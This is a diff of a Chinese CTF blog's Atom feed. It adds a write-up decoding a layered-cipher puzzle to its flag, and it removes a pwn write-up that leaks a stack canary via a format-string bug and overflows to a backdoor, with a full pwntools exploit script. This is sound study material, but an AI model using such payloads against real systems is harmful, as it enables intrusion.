@@ -2,14 +2,64 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://cc-nianchu.github.io</id>
     <title>nianchu</title>
-    <updated>2021-12-02T05:57:21.942Z</updated>
+    <updated>2022-09-28T11:11:51.832Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://cc-nianchu.github.io"/>
     <link rel="self" href="https://cc-nianchu.github.io/atom.xml"/>
     <subtitle>nianchu的blog</subtitle>
     <logo>https://cc-nianchu.github.io/images/avatar.png</logo>
     <icon>https://cc-nianchu.github.io/favicon.ico</icon>
-    <rights>All rights reserved 2021, nianchu</rights>
+    <rights>All rights reserved 2022, nianchu</rights>
+    <entry>
+        <title type="html"><![CDATA[buu 的 WUSTCTF2020 佛说：只能四天]]></title>
+        <id>https://cc-nianchu.github.io/post/buu-de-wustctf2020-fo-shuo-zhi-neng-si-tian/</id>
+        <link href="https://cc-nianchu.github.io/post/buu-de-wustctf2020-fo-shuo-zhi-neng-si-tian/">
+        </link>
+        <updated>2022-09-28T03:29:47.000Z</updated>
+        <content type="html"><![CDATA[<h4 id="下载附件后得到三个附件">下载附件后得到三个附件</h4>
+<p>hint.txt:</p>
+<pre><code>1. 虽然有点不环保，但hint好像是一次性的，得到后就没有利用价值了。
+2. 凯撒不是最后一步，by the way，凯撒为什么叫做凯撒？
+</code></pre>
+<p>题目.txt:</p>
+<pre><code>尊即寂修我劫修如婆愍闍嚤婆莊愍耨羅嚴是喼婆斯吶眾喼修迦慧迦嚩喼斯願嚤摩隸所迦摩吽即塞願修咒莊波斯訶喃壽祗僧若即亦嘇蜜迦須色喼羅囉咒諦若陀喃慧愍夷羅波若劫蜜斯哆咒塞隸蜜波哆咤慧聞亦吽念彌諸嘚嚴諦咒陀叻咤叻諦缽隸祗婆諦嚩阿兜宣囉吽色缽吶諸劫婆咤咤喼愍尊寂色缽嘚闍兜阿婆若叻般壽聞彌即念若降宣空陀壽愍嚤亦喼寂僧迦色莊壽吽哆尊僧喼喃壽嘚兜我空所吶般所即諸吽薩咤諸莊囉隸般咤色空咤亦喃亦色兜哆嘇亦隸空闍修眾哆咒婆菩迦壽薩塞宣嚩缽寂夷摩所修囉菩阿伏嘚宣嚩薩塞菩波吶波菩哆若慧愍蜜訶壽色咒兜摩缽摩諦劫諸陀即壽所波咤聞如訶摩壽宣咤彌即嚩蜜叻劫嘇缽所摩闍壽波壽劫修訶如嚩嘇囉薩色嚤薩壽修闍夷闍是壽僧劫祗蜜嚴嚩我若空伏諦念降若心吽咤隸嘚耨缽伏吽色寂喃喼吽壽夷若心眾祗喃慧嚴即聞空僧須夷嚴叻心願哆波隸塞吶心須嘇摩咤壽嘚吶夷亦心亦喃若咒壽亦壽囑囑
+</code></pre>
+<p>题目描述.txt：</p>
+<pre><code>圣经分为《旧约全书》和《新约全书》
+</code></pre>
+<p>因为看到题目里面是佛语</p>
+<p>一开始就认为是**<a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅 </a>**加密解密</p>
+<p>然后 显示 是无法解密</p>
+<p>根据题目描述:</p>
+<p>圣经分为《旧约全书》和《新约全书》</p>
+<p>我就想到去<a href="http://hi.pcmoe.net/buddha.html">新约佛论禅/佛曰加密</a>加密解密</p>
+<p>然后输入密语解密得：</p>
+<pre><code>平等文明自由友善公正自由诚信富强自由自由平等民主平等自由自由友善敬业平等公正平等富强平等自由平等民主和谐公正自由诚信平等和谐公正公正自由法治平等法治法治法治和谐和谐平等自由和谐自由自由和谐公正自由敬业自由文明和谐平等自由文明和谐平等和谐文明自由和谐自由和谐和谐平等和谐法治公正诚信平等公正诚信民主自由和谐公正民主平等平等平等平等自由和谐和谐和谐平等和谐自由诚信平等和谐自由自由友善敬业平等和谐自由友善敬业平等法治自由法治和谐和谐自由友善公正法治敬业公正友善爱国公正民主法治文明自由民主平等公正自由法治平等文明平等友善自由平等和谐自由友善自由平等文明自由民主自由平等平等敬业自由平等平等诚信富强平等友善敬业公正诚信平等公正友善敬业公正平等平等诚信平等公正自由公正诚信平等法治敬业公正诚信平等法治平等公正友善平等公正诚信自由公正友善敬业法治法治公正公正公正平等公正诚信自由公正和谐公正平等
+</code></pre>
+<p>发现这是 <a href="https://atool.vip/corevalue/">社会主义核心价值观编码器</a></p>
+<p>输入密语解密得：</p>
+<pre><code>RLJDQTOVPTQ6O6duws5CD6IB5B52CC57okCaUUC3SO4OSOWG3LynarAVGRZSJRAEYEZ_ooe_doyouknowfence
+</code></pre>
+<p>观察最后那句话doyouknowfence很明显是一句“出题人留下的线索”</p>
+<p>然后我们去试试栅栏密码  每组字数一个个试  经过测试很明显 当字数为4每组时</p>
+<p>得的的解密语</p>
+<pre><code>R5UALCUVJDCGD63RQISZTBOSO54JVBORP5SAT2OEQCWY6CGEO53Z67L_doyouknowCaesar
+</code></pre>
+<p>可以观察到后面跟上面一样 有“出题人留下的线索”</p>
+<p>doyouknowcaesar</p>
+<p>然后通过hint 凯撒为什么叫凯撒</p>
+<p>是因为	一开始凯撒密码最早由古罗马军事统帅盖乌斯·尤利乌斯·凯撒在军队中用来传递加密信息  也是通过位移3来传递</p>
+<p>所以通过凯撒密码 解密得</p>
+<pre><code>O5RXIZRSGAZDA63ONFPWQYLPL54GSYLOM5PXQ2LBNZTV6ZDBL53W67I
+</code></pre>
+<p>一开始觉得解出来的思路是错误的  因为感觉解出来没有任何提示而且很奇怪  后面看到提示说凯撒密码不是最后一步  说明我们还要继续解密</p>
+<p>可以观察到 上列密语 只有A-Z和数字2-5  因此我们可以尝试一下base32（当时做题的时候没想到这个 后面看wp才知道）</p>
+<p>然后通过base32解密</p>
+<p>得：</p>
+<pre><code>  wctf2020{ni_hao_xiang_xiang_da_wo}
+</code></pre>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[不更新怕被删博客]]></title>
         <id>https://cc-nianchu.github.io/post/bu-geng-xin-pa-bei-shan-bo-ke/</id>
@@ -1141,141 +1191,6 @@ log. info(&quot;leaking: 0x%x -&gt; %s&quot; 8 (addr, (data or '') .encode('hex'
 return data
 </code></pre>
 <p>每次执行write()函数后，都需要一个&quot;pop;pop;pop;ret&quot;的gadget将3个参数弹出，从而使栈达到平衡，然后再返回到start函数开启下一轮，从而满足DynELF需要循环泄漏的条件</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[利用格式化字符串漏洞获得Canary进行栈溢出]]></title>
-        <id>https://cc-nianchu.github.io/post/li-yong-ge-shi-hua-zi-fu-chuan-lou-dong-huo-de-canary-jin-xing-zhan-yi-chu/</id>
-        <link href="https://cc-nianchu.github.io/post/li-yong-ge-shi-hua-zi-fu-chuan-lou-dong-huo-de-canary-jin-xing-zhan-yi-chu/">
-        </link>
-        <updated>2021-07-18T02:21:16.000Z</updated>
-        <content type="html"><![CDATA[<p>题目在攻防世界进阶区第一题Mary_Morton，也是一道基础题<br>
-拿到题目先checksec一下</p>
-<pre><code>    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)
-</code></pre>
-<p>发现是64位程序，而且开了Canary和NX保护 打开ida64 F5获得伪代码</p>
-<pre><code>void __fastcall __noreturn main(int a1, char **a2, char **a3)
-{
-  int v3; // [rsp+24h] [rbp-Ch] BYREF
-  unsigned __int64 v4; // [rsp+28h] [rbp-8h]
-
-  v4 = __readfsqword(0x28u);
-  sub_4009FF();
-  puts(&quot;Welcome to the battle ! &quot;);
-  puts(&quot;[Great Fairy] level pwned &quot;);
-  puts(&quot;Select your weapon &quot;);
-  while ( 1 )
-  {
-    while ( 1 )
-    {
-      sub_4009DA();
-      __isoc99_scanf(&quot;%d&quot;, &amp;v3);
-      if ( v3 != 2 )
-        break;
-      sub_4008EB();
-    }
-    if ( v3 == 3 )
-    {
-      puts(&quot;Bye &quot;);
-      exit(0);
-    }
-    if ( v3 == 1 )
-      sub_400960();
-    else
-      puts(&quot;Wrong!&quot;);
-  }
-}
-</code></pre>
-<p>很明显是一道给选择的题目，打开题目函数</p>
-<pre><code>int sub_4009DA()
-{
-  puts(&quot;1. Stack Bufferoverflow Bug &quot;);
-  puts(&quot;2. Format String Bug &quot;);
-  return puts(&quot;3. Exit the battle &quot;);
-}
-</code></pre>
-<p>题目已经告诉我们1是栈溢出，2是字符串格式化漏洞，但是因为开了Canary，所以要是需要栈溢出我们需要获得Canary的值，才能进行栈溢出。</p>
-<pre><code>函数一
-unsigned __int64 sub_400960()
-{
-  char buf[136]; // [rsp+0h] [rbp-90h] BYREF
-  unsigned __int64 v2; // [rsp+88h] [rbp-8h]
-
-  v2 = __readfsqword(0x28u);
-  memset(buf, 0, 0x80uLL);
-  read(0, buf, 0x100uLL);
-  printf(&quot;-&gt; %s\n&quot;, buf);
-  return __readfsqword(0x28u) ^ v2;
-}
-函数二
-unsigned __int64 sub_4008EB()
-{
-  char buf[136]; // [rsp+0h] [rbp-90h] BYREF
-  unsigned __int64 v2; // [rsp+88h] [rbp-8h]
-
-  v2 = __readfsqword(0x28u);
-  memset(buf, 0, 0x80uLL);
-  read(0, buf, 0x7FuLL);
-  printf(buf);
-  return __readfsqword(0x28u) ^ v2;
-}
-后门函数
-int sub_4008DA()
-{
-  return system(&quot;/bin/cat ./flag&quot;);
-}
-</code></pre>
-<p>因为有canary保护，return的是v2，所以v2应该就是canary的值<br>
-<img src="https://cc-nianchu.github.io/post-images/1626575797030.png" alt="" loading="lazy"><br>
-思路：首先利用字符串漏洞，泄露出canary的值，然后在函数要返回的时候再填回去，之后利用栈溢出，让其返回到后门函数。<br>
-字符串格式化漏洞先手计算偏移量</p>
-<pre><code>Welcome to the battle ! 
-[Great Fairy] level pwned 
-Select your weapon 
-1. Stack Bufferoverflow Bug 
-2. Format String Bug 
-3. Exit the battle 
-2
-AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
-
-AAAA 0x7fffc952c6c0 0x7f 0x7f08d64a3151 (nil) (nil) 0x2070252041414141 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0xa7025 (nil) (nil) (nil) (nil) (nil)
-</code></pre>
-<p>在这里发现字符串偏移量为6，再确定canary和输入的参数之间的偏移<br>
-buf到v2   0x90-0x08=0x88<br>
-因为这是64位的程序，每个格式化字符串都是8字节，同理32位是4字节<br>
-所以0x88=136   136/8=17    所以总偏移量为17+6=23<br>
-所以第一次先泄漏canary<br>
-第一个payload='%23$p'<br>
-然后canary=int(recv(16),16)   接受16个字节<br>
-然后print canary<br>
-构造第二个payload ='a'*0x88+p64(canary)+'a'*8+p64(后门函数地址)<br>
-exp如下:</p>
-<pre><code>from pwn import *
-
-#r=process('./Mary_Morton')
-r=remote('111.200.241.244',63833)
-
-#r.recvuntil('3. Exit the battle')
-r.sendline('2')
-
-r.sendline('%23$p')
-
-r.recvuntil('0x')
-canary=int(r.recv(16),16)
-print (canary)
-
-door_addr=0x4008da
-payload='a'*0x88+p64(canary)+'a'*8+p64(door_addr)
-#r.recvuntil('3. Exit the battle')
-r.sendline('1')
-r.sendline(payload)
-
-r.interactive()
-</code></pre>
 ]]></content>
     </entry>
 </feed>
